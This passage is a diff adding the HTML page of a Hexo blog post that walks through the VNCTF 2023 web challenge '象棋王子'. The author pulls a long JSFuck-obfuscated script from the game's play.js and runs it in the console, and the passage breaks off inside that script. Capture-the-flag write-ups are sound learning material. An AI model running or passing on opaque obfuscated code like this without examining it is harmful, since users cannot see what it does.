@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="ctf, solution, note, blog">
+    
+    <meta name="author" content="Forestsetyou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://forestsetyou.github.io/2023/02/28/security/ctf/vnctf/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="false">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VnCtf">
+<meta property="og:url" content="http://forestsetyou.github.io/2023/02/28/Security/CTF/VnCtf/index.html">
+<meta property="og:site_name" content="Festu&#39;s Blog">
+<meta property="og:description" content="false">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://picturebed-1310517892.file.myqcloud.com/Figure_2.png">
+<meta property="og:image" content="https://picturebed-1310517892.file.myqcloud.com/Figure_1.png">
+<meta property="og:image" content="https://picturebed-1310517892.file.myqcloud.com/imageonline-co-gifimage.gif">
+<meta property="article:published_time" content="2023-02-28T14:42:00.000Z">
+<meta property="article:modified_time" content="2023-03-11T07:51:00.000Z">
+<meta property="article:author" content="Forestsetyou">
+<meta property="article:tag" content="ctf, solution, note, blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picturebed-1310517892.file.myqcloud.com/Figure_2.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/hide_imgs/smiling_face.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/hide_imgs/smiling_face.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/hide_imgs/smiling_face.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            VnCtf -
+        
+        Festu&#39;s Blog
+    </title><meta name="robots" content="noindex">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Festu&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"forestsetyou.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":false,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/hide_imgs/light_banner-5.png","dark":"/hide_imgs/dark_banner.png"},"title":"Festu's Blog","subtitle":{"text":["Life Goes On."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":false},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Forestsetyou","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"categories":{"path":"/categories","icon":"fa-regular fa-folder"},"tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/03/11 03:27:59"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/hide_imgs/smiling_face.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Festu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/hide_imgs/post_thumbnail.png" alt="VnCtf" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">VnCtf</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/hide_imgs/avatar.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Forestsetyou</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-02-28 22:42</span>
+        <span class="mobile">2023-02-28 22:42</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-03-11 15:51</span>
+            <span class="mobile">2023-03-11 15:51</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Security/">Security</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Security/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="VnCtf"><a href="#VnCtf" class="headerlink" title="VnCtf"></a>VnCtf</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="象棋王子"><a href="#象棋王子" class="headerlink" title="象棋王子"></a>象棋王子</h3><p>先下一下传统象棋，显然下不过，那看看源码，”js&#x2F;play.js”下有游戏源码，翻到最后有一个”showWin”函数，my&#x3D;&#x3D;1的情况就是获胜，下面是一串很抽象的js代码，丢进控制台中跑一跑：</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (+(!+[] + !+[] + !+[] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + !+[] + [!+[] + !+[]]) + (![] + [])[+!+[]] + (![] + [])[!+[] + !+[]])()([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [!+[] + !+[]]] + ((![] + [])[+!+[]] + (![] + [])[!+[] + !+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+!+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [!+[] + !+[] + !+[] + !+[] + !+[]] + [+[]] + (!![] + [])[+[]] + [!+[] + !+[] + !+[] + !+[]] + [!+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[]] + [!+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[]] + [+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + [!+[] + !+[] + !+[] + !+[]] + [+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + [!+[] + !+[] + !+[] + !+[]] + [+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [+!+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + (!![] + [])[+[]] + [!+[] + !+[] + !+[] + !+[]] + [+[]] + (![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[]] + (!![] + [])[+[]] + [!+[] + !+[] + !+[] + !+[]] + [+[]] + (![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[]] + [+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[]] + [+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + (+[![]] + [])[+[]] + (!![] + [])[+[]] + [+!+[]] + [+[]] + [!+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[]] + [!+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[]] + [+[]] + [!+[] + !+[]] + [!+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [+!+[]] + [!+[] + !+[] + !+[] + !+[] + !+[] + !+[] + !+[]] + [!+[] + !+[] + !+[] + !+[] + !+[]] + (!![] + [])[+[]] + [!+[] + !+[] + !+[] + !+[]] + [!+[] + !+[]] + (!![] + [])[+[]] + [!+[] + !+[] + !+[] + !+[] + !+[]] + [+!+[]])[(![] + [])[!+[] + !+[] + !+[]] + (+(!+[] + !+[] + [+!+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + 